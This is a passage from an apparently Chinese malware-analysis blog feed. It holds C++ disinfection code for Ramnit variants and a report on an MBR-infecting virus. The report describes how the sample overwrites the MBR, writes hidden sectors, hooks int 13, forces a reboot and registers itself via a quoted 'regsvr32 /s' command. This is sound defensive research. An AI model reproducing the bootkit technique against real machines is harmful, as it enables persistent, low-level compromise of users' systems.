class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//声明</span></span><br><span class="line">DWORD median;</span><br><span class="line">DWORD RAW;</span><br><span class="line"></span><br><span class="line">RAW = sectionHeader[numOfSection - <span class="number">1</span>].PointerToRawData;</span><br><span class="line">median = *(PDWORD)((PBYTE)dosHeader + RAW + <span class="number">0x328</span>);</span><br><span class="line">OEP = optionalHeader-&gt;AddressOfEntryPoint - median;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|成功获取到原始OEP：%x\n&quot;</span>,OEP);</span><br><span class="line">&#125;</span><br><span class="line">Ramnit.A变种的OEP</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">GetOEP</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//声明</span></span><br><span class="line">DWORD median;</span><br><span class="line">DWORD RAW;</span><br><span class="line"></span><br><span class="line">RAW = sectionHeader[numOfSection - <span class="number">1</span>].PointerToRawData;</span><br><span class="line">median = *(PDWORD)((PBYTE)dosHeader + RAW +  <span class="number">0x771</span>);</span><br><span class="line">OEP = optionalHeader-&gt;AddressOfEntryPoint - median;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|成功获取到原始OEP：%x\n&quot;</span>,OEP);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="设置感染标记"><a href="#设置感染标记" class="headerlink" title="设置感染标记"></a>设置感染标记</h3><p>对于<code>Ramnit.A</code>变种，在文件末尾添加任意被感染文件末尾24字节的感染标记即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EF DA DA 59 BD 19 C1 A3 EA DA DA 59 EF DA DA 59 E2 DA DA 59 3D EF 0C 15 65 9B 0F 04 8D D4 DF 59 EA DA DA 59</span><br></pre></td></tr></table></figure><p>对于<code>Ramnit.X，AS 变种</code>，添加.rmnet节表</p><h3 id="删除感染节表"><a href="#删除感染节表" class="headerlink" title="删除感染节表"></a>删除感染节表</h3><p>删除感染节表</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//删除感染节表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FixSection</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//删除多余节表数据</span></span><br><span class="line">optionalHeader-&gt;SizeOfImage -= sectionHeader[numOfSection - <span class="number">1</span>].Misc.VirtualSize;  <span class="comment">//修正sizeofimage  </span></span><br><span class="line"><span class="built_in">memset</span>(sectionHeader[numOfSection - <span class="number">1</span>].PointerToRawData + (PBYTE)dosHeader, <span class="number">0</span>,  sectionHeader[numOfSection - <span class="number">1</span>].SizeOfRawData);</span><br><span class="line"></span><br><span class="line"><span class="comment">//修正DOS头</span></span><br><span class="line">fileHeader-&gt;NumberOfSections--;<span class="comment">//节表个数-1</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;sectionHeader[numOfSection - <span class="number">1</span>], <span class="number">0</span>, <span class="number">0x28</span>);<span class="comment">//将最后一个节的数据全置0</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|成功修复多余节表！\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="删除感染数据"><a href="#删除感染数据" class="headerlink" title="删除感染数据"></a>删除感染数据</h3><h4 id="删除感染PE数据"><a href="#删除感染PE数据" class="headerlink" title="删除感染PE数据"></a>删除感染PE数据</h4><p><code>Ramnit.A</code>变种和<code>Ramnit.X，AS 变种</code>删除.exe和.dll文件都可用如下方法删除感染数据</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">deldata</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">           DWORD Distance = (sectionHeader[numOfSection - <span class="number">2</span>].SizeOfRawData + sectionHeader[numOfSection - <span class="number">2</span>].PointerToRawData);</span><br><span class="line">HANDLE hFile1 = CreateFileA(filename, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">SetFilePointer(hFile1, Distance, <span class="number">0</span>, FILE_BEGIN);</span><br><span class="line">SetEndOfFile(hFile1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="删除感染网页数据"><a href="#删除感染网页数据" class="headerlink" title="删除感染网页数据"></a>删除感染网页数据</h4><p>删除网页的感染数据稍微不同，因为<code>Ramnit.A</code>变种网页数据后面还有随机长度的密钥以及感染标志，因此删除网页感染数据代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修复Ramnit.A</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">repairHtml2</span><span class="params">(<span class="keyword">char</span> filepath[MAX_PATH])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> Buffer[<span class="number">600</span>];</span><br><span class="line">HANDLE hfile;</span><br><span class="line">DWORD NumberOfBytesRead;</span><br><span class="line">SetFileAttributesA(filepath, FILE_ATTRIBUTE_NORMAL);</span><br><span class="line">hfile = CreateFileA(filepath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hfile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">DWORD filesize = GetFileSize(hfile, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (filesize != <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">SetFilePointer(hfile, filesize - <span class="number">539</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//539为附加随机数据的最大长度</span></span><br><span class="line">ReadFile(hfile, Buffer, <span class="number">539</span>, &amp;NumberOfBytesRead, <span class="number">0</span>);<span class="comment">//读取文件末尾539字节的数据到buffer中</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> strcharacteristic[<span class="number">20</span>] = <span class="string">&quot;&lt;/SCRIPT&gt;&lt;!--&quot;</span>;</span><br><span class="line"><span class="keyword">char</span>* ret = <span class="built_in">strstr</span>(Buffer, strcharacteristic);</span><br><span class="line">DWORD Distance = filesize - (<span class="number">262630</span> + (<span class="number">539</span> - (ret - Buffer) - <span class="number">13</span>));</span><br><span class="line">SetFilePointer(hfile, Distance, <span class="number">0</span>, FILE_BEGIN);</span><br><span class="line">SetEndOfFile(hfile);</span><br><span class="line">CloseHandle(hfile);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">CloseHandle(hfile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//修复Ramnit.X，AS 变种</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">repairHtml1</span><span class="params">(<span class="keyword">char</span> filepath[MAX_PATH])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> Buffer[<span class="number">20</span>];</span><br><span class="line">HANDLE hfile;</span><br><span class="line">DWORD NumberOfBytesRead;</span><br><span class="line">SetFileAttributesA(filepath, FILE_ATTRIBUTE_NORMAL);</span><br><span class="line">hfile = CreateFileA(filepath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hfile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">DWORD filesize = GetFileSize(hfile, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (filesize != <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">SetFilePointer(hfile, filesize - <span class="number">280034</span>, <span class="number">0</span>, FILE_BEGIN);</span><br><span class="line">SetEndOfFile(hfile);</span><br><span class="line">CloseHandle(hfile);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 样本分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 奇兵计划 </tag>
            
            <tag> 样本分析报告 </tag>
            
            <tag> Ramnit </tag>
            
            <tag> Virus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MBR感染病毒分析报告</title>
      <link href="2019/10/30/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
      <url>2019/10/30/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<center><font size = 8><b>MBR感染病毒分析报告</b></font></center><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><table><thead><tr><th align="center">样本名称</th><th align="center">1.exe11.vir</th></tr></thead><tbody><tr><td align="center"><strong>样本类型</strong></td><td align="center"><strong>MBR感染型病毒</strong></td></tr><tr><td align="center"><strong>样本大小</strong></td><td align="center"><strong>236 KB (242,176 字节)</strong></td></tr><tr><td align="center"><strong>MD5</strong></td><td align="center"><strong>8cfa512ba62399f135c03505a93533f3</strong></td></tr></tbody></table><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>该样本为MBR感染型病毒，其通过修改原始MBR，从而实现在开机运行操作系统之前，执行修改后的MBR中的指令，其对系统进行了3次Hook，最终再开始时加载其写入的驱动文件来实施攻击。经过分析该样本只针对于XP操作系统进行攻击，攻击手段十分隐蔽，并且攻击十分底层，一般情况下很难发现该恶意样本的恶意源头。</p></blockquote><h1 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h1><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_MBR%E6%84%9F%E6%9F%93%E6%80%A7%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A.png" alt="08_MBR感染性病毒分析报告"></p><h1 id="简单行为分析"><a href="#简单行为分析" class="headerlink" title="简单行为分析"></a>简单行为分析</h1><h2 id="文件写入行为"><a href="#文件写入行为" class="headerlink" title="文件写入行为"></a>文件写入行为</h2><p>运行样本后，该样本进行了3次文件写入行为，分别为：</p><ul><li><p>1.往磁盘DR0中写入数据；</p></li><li><p>2.在样本目录中释放与样本同名的dll文件；</p></li><li><p>3.在临时目录中写入临时文件<code>00000218.tmp</code></p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028110112117.png" alt="image-20191028110112117"></p><center>图1</center>## 注册系统服务<p>运行样本后，该样本通过调用<code>regsvr32.exe</code>，将释放出来的样本同名的dll文件注册为系统服务。执行的参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 &#x2F;s &quot;C:\Documents and Settings\Administrator\桌面\8cfa512ba62399f135c03505a93533f3_1.dll&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028110816898.png" alt="image-20191028110816898"></p><center>图2</center># 样本详细分析<h2 id="分析样本文件本身"><a href="#分析样本文件本身" class="headerlink" title="分析样本文件本身"></a>分析样本文件本身</h2><p>首先通过查壳工具，发现该样本文件是<code>ASPack</code>壳，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028111357118.png" alt="image-20191028111357118"></p><p>然后通过ESP定律将其脱去。脱壳中值得注意的是，该样本有2层<code>ASPack</code>壳，脱壳时需要脱两次。</p><p><strong>然后将其拖入IDA和OD中分析，该样本主要行为有：</strong></p><ul><li>往临时文件<code>C:\Windows\temp\00000218.tmp</code>中，写入执行日志。</li><li>将控制代码<code>IOCTL_VOLUME_LOGICAL_TO_PHYSICAL</code>发送到\\.\C:，来获取物理磁盘号和物理偏移量相对应的逻辑偏移量。 </li><li>然后根据内存地址<code>MEMORY[0x7FFE0500] </code>中的值是否等于0xEE00A121，来判断当前操作系统是否已经被感染，若被感染执行相应操作。</li><li>创建互斥体==Global\7BC8413E-DEF5-4BF6-9530-9EAD7F45338B==。</li><li>修改MBR中的数据，并将原始MBR数据存储在62扇区中。另外还从当前文件中读取两个512字节的数据写入到60和61扇区中，还写入了一个PE文件。</li><li>重启后删除自身文件，拷贝自身文件到当前目录，并伪装成一个dll文件。然后再将该dll文件注册为系统服务。</li><li>强制重启计算机。从而执行感染后的MBR。</li></ul><p><strong>主函数代码如图：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028132331860.png" alt="image-20191028132331860"></p><h3 id="写入执行日志"><a href="#写入执行日志" class="headerlink" title="写入执行日志"></a>写入执行日志</h3><p>通过调用函数<code>WriteFile_401B81</code>，将传进来的记录日志的字符串，写入”C:\Windows\temp\00000218.tmp”文件中。从而记录该样本执行过程的相关日志，函数<code>WriteFile_401B81</code>代码如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028133224104.png" alt="image-20191028133224104"></p><h3 id="获取逻辑偏移量"><a href="#获取逻辑偏移量" class="headerlink" title="获取逻辑偏移量"></a>获取逻辑偏移量</h3><p>通过调用函数<code>DeviceIoControl</code>，将控制代码<code>IOCTL_VOLUME_LOGICAL_TO_PHYSICAL</code>发送到\\.\C:中，从而来获取物理磁盘号和物理偏移量相对应的==逻辑偏移量==。 其中函数<code>DeviceIoControl_402BF9</code>代码如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028133729406.png" alt="image-20191028133729406"></p><h3 id="判断是否被感染"><a href="#判断是否被感染" class="headerlink" title="判断是否被感染"></a>判断是否被感染</h3><p>根据内存地址<code>MEMORY[0x7FFE0500] </code>中的值是否等于0xEE00A121，来进行判断当前操作系统是否已经被感染，若被感染执行相应操作。感染前改地址处的值为0，当被感染后改地址的值将被置为0xEE00A121，然后根据判断结果执行不同的操作，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028134719868.png" alt="image-20191028134719868"></p><h3 id="创建互斥体"><a href="#创建互斥体" class="headerlink" title="创建互斥体"></a>创建互斥体</h3><p>通过调用函数<code>CreateMutex_402B93</code>，来进行判断互斥体”Global\7BC8413E-DEF5-4BF6-9530-9EAD7F45338B”是否存在，若不存在则创建该互斥体，若存在直接退出当前进程。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028134830359.png" alt="image-20191028134830359"></p><h3 id="修改MBR往扇区中写入数据"><a href="#修改MBR往扇区中写入数据" class="headerlink" title="修改MBR往扇区中写入数据"></a>修改MBR往扇区中写入数据</h3><p>通过调用函数<code>AlterMBR_402407</code>，修改原始MBR中的数据，并将原始MBR数据存储在62扇区中。另外还从当前文件中读取两个512字节的数据写入到60和61扇区中。</p><p><strong>读取原始MBR</strong></p><p>先通过函数<code>CreateFileA</code>，获取\.\physicalDrive0文件的句柄hDevice。</p><p>再通过调用函数<code>DeviceIoControl</code>，来检索有关物理磁盘的信息，然后再从DR0中偏移00位置处读取<code>原始MBR</code>到指定Buffer_init00MBR中。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028140620390.png" alt="image-20191028140620390"></p><p><strong>写入数据</strong></p><p>然后连续调用5次<code>WriteFile</code>，分别写入：</p><ul><li>往偏移<code>0xE0FFF00000</code>处，写入大小为0x3BC00大小的PE文件</li><li>往偏移<code>0x7800（60扇区）</code>处，写入大小为512字节的数据</li><li>往偏移<code>0x7A00（61扇区）</code>处，写入经过修改的大小为512字节的数据</li><li>往偏移<code>0x7C00（62扇区）</code>处，写入之前读取到的原始MBR数据</li><li>往偏移为<code>0x0（MBR）</code>处，写入修改后的MBR数据，从而实现感染MBR</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028142205471.png" alt="image-20191028142205471"></p><h3 id="拷贝自身文件并注册系统服务"><a href="#拷贝自身文件并注册系统服务" class="headerlink" title="拷贝自身文件并注册系统服务"></a>拷贝自身文件并注册系统服务</h3><ul><li>通过调用函数<code>MoveFileExA</code>将自身文件拷贝到当前目录，并将文件后缀名重命名为.dll，然后设置参数为<code>MOVEFILE_DELAY_UNTIL_REBOOT</code>，重启后删除自身文件。</li><li>通过调用函数<code>AlterCharacteristic_403422</code>修改复制后的.dll文件的<code>characteristics</code>，来将该EXE文件的属性修改为DLL文件</li><li>通过函数<code>CreateService_40316F</code>调用<code>regsvr32</code>，执行命令regsvr32 /s “C:\Users\<username>\Desktop\dump.dll”，来将复制后的dll文件注册为系统服务</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028145157927.png" alt="image-20191028145157927"></p><h3 id="强制重新启动"><a href="#强制重新启动" class="headerlink" title="强制重新启动"></a>强制重新启动</h3><p>先获取特权<code>SeShutdownPrivilege</code>，再调用函数<code>InitiateSystemShutdownA</code>，强制关闭应用程序，并重新启动本地计算机，从而执行感染后的MBR，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028145711134.png" alt="image-20191028145711134"></p><h2 id="分析修改后的MBR"><a href="#分析修改后的MBR" class="headerlink" title="分析修改后的MBR"></a>分析修改后的MBR</h2><p>首先修改虚拟机的<code>VMX</code>文件，再通过强大的IDA来调试虚拟机中的系统MBR。</p><p>并在MBR载入内存的地方==7C00==处下断，然后运行到此处。由于<code>MBR</code>是运行在==实模式==下的，所以这里还需要将IDA区段属性修改为16位汇编模式。然后就能看到==7C00==处解析出的16位汇编代码，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1571824196358.png" alt="1571824196358"></p><p>修改后的MBR主要实现了功能有：</p><ul><li>申请2KB大小的内存空间，将修改后的<code>MBR数据</code>写入申请的内存空间中</li><li>读取60和61扇区中的数据到申请的内存空间中</li><li>Hook<code>int 13</code>中断表中的跳转的地址，将要跳转的地址修改为申请的内存空间</li><li>恢复原始MBR，通过调用被Hook的<code>int 13</code>，将磁盘62扇区中的原始MBR数据读取到内存0x7C00，再跳转到0x7C00执行原本MBR指令。</li></ul><h3 id="将修改后的MBR写入申请的内存空间中"><a href="#将修改后的MBR写入申请的内存空间中" class="headerlink" title="将修改后的MBR写入申请的内存空间中"></a>将修改后的MBR写入申请的内存空间中</h3><p><strong>申请内存空间</strong></p><p>偏移<code>[0x413]</code>中记录了bios内存可用区域，通过将偏移<code>[0X413]</code>的数值减2，来申请大小为2KB的内存空间，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1571837198321.png" alt="1571837198321"></p><p><strong>将修改后的MBR写入申请的内存空间中</strong></p><p>首先通过寄存器<code>ax</code>左移6位，计算出分配的内存的段起始地址。然后再将当前内存地址为<code>[0x7C00]</code>也就是当前执行的修改后的MBR指令，拷贝到分配的段起始位置<code>ES：00(9F000)</code>中，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028162052653.png" alt="image-20191028162052653"></p><p>拷贝后内存地址<code>0x9F000</code>上的数据，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028162432362.png" alt="image-20191028162432362"></p><h3 id="读取60和61扇中的数据到申请的内存空间中"><a href="#读取60和61扇中的数据到申请的内存空间中" class="headerlink" title="读取60和61扇中的数据到申请的内存空间中"></a>读取60和61扇中的数据到申请的内存空间中</h3><p>通过调用<code>int 13h</code>中断，跳转到地址<code>ECBE2</code>执行指令，来读取磁盘==0磁道60扇区(7800)和61扇区(7A00)==大小为2个扇区的数据到<code>ES:BX(9F00:200)（9F200）</code>，紧挨着上一步写入的修改后的<code>MBR</code>数据后面。其中60和61扇区中的数据是之前分析过的样本==恶意写入磁盘中的两段数据==，汇编指 令如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028163914300.png" alt="image-20191028163914300"></p><p><code>int 13</code>中断处的跳转的地址为<code>ECBE2</code>，跳到该地址查看汇编指令。由于此时的<code>int 13</code>中断表跳转的地址是由系统加载的，并没有被修改，所要执行的的指令都是正常的，因此这里也就不需要跟下去分析了，<code>ECBE2</code>汇编指令如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028165018664.png" alt="image-20191028165018664"></p><p>直接查看拷贝后的数据 ，查看申请的内存地址<code>0x9EE00</code>中存储的之前样本恶意写入==60和61扇区==中的数据，拷贝后内存地址<code>0x9EE00</code>上的数据如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028165823587.png" alt="image-20191028165823587"></p><p>此时内存空间中数据与样本写入磁盘的数据对应关系，如下表：</p><table><thead><tr><th align="left">开辟的内存地址</th><th align="left">数据来源</th></tr></thead><tbody><tr><td align="left">9F000</td><td align="left">修改后的MBR数据</td></tr><tr><td align="left">9F200</td><td align="left">样本写入磁盘60扇区中的数据</td></tr><tr><td align="left">9F400</td><td align="left">样本写入磁盘61扇区中的数据</td></tr></tbody></table><h3 id="Hook-int-13中断表"><a href="#Hook-int-13中断表" class="headerlink" title="Hook int 13中断表"></a>Hook int 13中断表</h3><p>Hook<code>int 13</code>中断表，修改<code>int 13</code>中断表中原本要跳转的地址<code>ECBE2</code>修改为申请的内存空间地址<code>9F066</code>，并将原本int 13中断要跳转的地址存储在<code>ES：0x73(9F073)</code>中，后面恢复时会用到，从而实现Hook。</p><p>然后将<code>9F00</code>和<code>004D</code>压进栈，通过<code>retf</code>指令跳转到内存地址<code>9F04D</code>去执行。由于之前已经将修改后的<code>MBR</code>写入到了申请的内存空间<code>9F000</code>中，所以这里跳到<code>9F04D</code>去执行，其实就等同于执行修改后<code>MBR</code>数据+偏移<code>0x4D</code>的处的指令。Hook int 13 中断表和跳转指令如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028170333376.png" alt="image-20191028170333376"></p><p>被Hook前后的 <code>int 13</code>要跳转的地址，如图： </p><p><img 